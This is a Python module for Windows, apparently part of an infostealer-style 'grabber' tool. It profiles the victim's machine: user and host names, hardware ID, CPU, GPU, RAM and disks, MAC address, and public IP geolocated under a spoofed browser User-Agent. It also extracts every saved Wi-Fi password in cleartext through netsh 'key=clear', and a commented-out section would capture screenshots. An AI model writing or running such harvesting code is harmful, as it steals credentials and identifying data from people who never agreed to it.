from typing import Any
import ctypes
import os
import sys
import re
import subprocess
import uuid

import psutil
import pythoncom
import requests

if sys.platform == "win32":
    import wmi  # type: ignore[import-not-found]

# from PIL import ImageGrab

assert sys.platform == "win32"


class SystemInfo:
    MODULE_NAME = "system_info"

    @classmethod
    def run_module(cls) -> dict[str, Any]:
        # To keep the output readable, let's avoid screenshots just for now
        # image = ImageGrab.grab(
        #     bbox=None,
        #     include_layered_windows=False,
        #     all_screens=True,
        #     xdisplay=None
        # )
        # image.save("screenshot.png")

        # Permits use of WMI in threads
        pythoncom.CoInitialize()
        res = {
            "user_data": cls.user_data(),
            "system_data": cls.system_data(),
            "disk_data": cls.disk_data(),
            "network_data": cls.network_data(),
            "wifi_data": cls.wifi_data(),
        }
        pythoncom.CoUninitialize()

        return res

    @staticmethod
    def user_data() -> dict[str, Any]:
        def display_name() -> str:
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3

            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)

            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)

            return nameBuffer.value

        disp_name = display_name()
        hostname = os.getenv("COMPUTERNAME")
        username = os.getenv("USERNAME")

        return {"display_name": disp_name, "hostname": hostname, "username": username}

    @staticmethod
    def system_data() -> dict[str, Any]:
        def get_hwid() -> str:
            try:
                hwid = (
                    subprocess.check_output(
                        "C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid",
                        shell=True,
                        stdin=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    .decode("utf-8")
                    .split("\n")[1]
                    .strip()
                )
            except Exception:
                hwid = "None"

            return hwid

        cpu = wmi.WMI().Win32_Processor()[0].Name
        gpu = wmi.WMI().Win32_VideoController()[0].Name
        ram = round(
            float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize)
            / 1048576,
            0,
        )
        hwid = get_hwid()

        return {"cpu": cpu, "gpu": gpu, "ram": ram, "hwid": hwid}

    @staticmethod
    def disk_data() -> dict[str, Any]:
        disk = ("{:<9} " * 4).format("Drive", "Free", "Total", "Use%") + "\n"
        for part in psutil.disk_partitions(all=False):
            if os.name == "nt":
                if "cdrom" in part.opts or part.fstype == "":
                    continue
            usage = psutil.disk_usage(part.mountpoint)
            disk += ("{:<9} " * 4).format(
                part.device,
                str(usage.free // (2**30)) + "GB",
                str(usage.total // (2**30)) + "GB",
                str(usage.percent) + "%",
            ) + "\n"

        return {"disk_info": disk}

    # hmm
    @staticmethod
    def network_data() -> dict[str, Any]:
        def geolocation(ip: str) -> dict[str, Any]:
            url = f"https://ipapi.co/{ip}/json/"
            response = requests.get(
                url,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                },
            )
            data = response.json()

            return {
                "country": data["country"],
                "region": data["region"],
                "city": data["city"],
                "postal": data["postal"],
                "asn": data["asn"],
            }

        ip = (
            requests.get("https://www.cloudflare.com/cdn-cgi/trace")
            .text.split("ip=")[1]
            .split("\n")[0]
        )
        mac = ":".join(re.findall("..", "%012x" % uuid.getnode()))
        geo_data = geolocation(ip)

        return {
            "ip": ip,
            "mac": mac,
            "country": geo_data["country"],
            "region": geo_data["region"],
            "city": geo_data["city"],
            "zip": geo_data["postal"],
            "asn": geo_data["asn"],
        }

    @staticmethod
    def wifi_data() -> dict[str, Any]:
        networks, out = [], ""
        try:
            wifi = (
                subprocess.check_output(
                    ["netsh", "wlan", "show", "profiles"],
                    shell=True,
                    stdin=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                .decode("utf-8")
                .split("\n")
            )
            wifi = [i.split(":")[1][1:-1] for i in wifi if "All User Profile" in i]

            for name in wifi:
                try:
                    results = (
                        subprocess.check_output(
                            ["netsh", "wlan", "show", "profile", name, "key=clear"],
                            shell=True,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                        )
                        .decode("utf-8")
                        .split("\n")
                    )
                    results = [
                        b.split(":")[1][1:-1] for b in results if "Key Content" in b
                    ]
                except subprocess.CalledProcessError:
                    networks.append((name, ""))
                    continue

                try:
                    networks.append((name, results[0]))
                except IndexError:
                    networks.append((name, ""))

        except subprocess.CalledProcessError:
            pass
        except UnicodeDecodeError:
            pass

        out += f'{"SSID":<20}| {"PASSWORD":<}\n'
        out += f'{"-"*20}|{"-"*29}\n'
        for name, password in networks:
            out += "{:<20}| {:<}\n".format(name, password)

        return {"wifi_info": out}
